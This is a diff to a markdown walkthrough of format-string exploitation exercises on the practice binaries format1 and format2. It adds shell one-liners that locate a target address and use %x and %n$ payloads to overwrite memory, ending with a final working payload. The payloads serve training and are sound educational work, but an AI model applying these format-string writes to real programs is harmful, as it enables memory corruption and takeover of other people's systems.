@@ -27,7 +27,9 @@
     - [format0 solution](#format0-solution)
   - [format1: assume no ASLR](#format1-assume-no-aslr)
   - [format1: solution](#format1-solution)
-  - [format2](#format2)
+  - [format2: `%n$` and arbitrary write](#format2-n-and-arbitrary-write)
+    - [format2 solution (ultimate)](#format2-solution-ultimate)
+  - [format3](#format3)
   - [format4: plt && got](#format4-plt--got)
 
 ## stack0
@@ -396,9 +398,13 @@ p &target
 ./format1 $(echo -en "AAAAAA\x38\x96\x04\x08BBBB";for i in {0..127};do echo -en "%.8x-";done;echo -en "%n";)
 ```
 
-## format2
+## format2: `%n$` and arbitrary write
+
+- ref: [%n$, specify the nth arg](https://www.ibm.com/docs/en/i/7.4?topic=functions-printf-print-formatted-characters)
 
 ```sh
+objdump -t ./format2
+  # 080496e4 &target
   # gdb -batch -ex 'file ./format2' -ex 'disassemble vuln'
 objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
 ```
@@ -432,5 +438,33 @@ objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
  80484b9:       c9                      leave
  80484ba:       c3                      ret
 ```
+
+```sh
+./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";for i in {0..3};do echo -en "%.8x-";done;echo -en "%n")
+  # 48 == &target
+  # 64 - 48 = 16
+./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";for i in {0..3};do echo -en "%.8x-";done;for i in {0..15};do echo -en "P";done;echo -en "%n")
+  # Though both are params of the printf(), the "P..." padding is after the &target and before the %n, hence does not affect the flow.
+  
+  # More elegantly:
+./format2 <<< $(echo -en "AAAA";for i in {0..3};do echo -en "|%.8x";done;)
+  # find the 0x41414141
+./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%5$x')
+  # now the &target is the 5th argument(in 32-bit hex) on the stack (AAAA is the 4th)
+  # %5$: `%n$` a form of conversion specifications. The nth argument on the stack.
+./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$16d%5$x')
+  # add padding on the printing format of %6$<len><type>
+./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$52x%5$n')
+```
+
+### format2 solution (ultimate)
+
+```sh
+./format2 <<< $(echo -en "AAAA";for i in {0..3};do echo -en "|%.8x";done;)
+./format2 <<< $(echo -en "\xe4\x96\x04\x08";echo -en '%5$60x%4$n')
+```
+
+## format3
+
 
 ## format4: plt && got
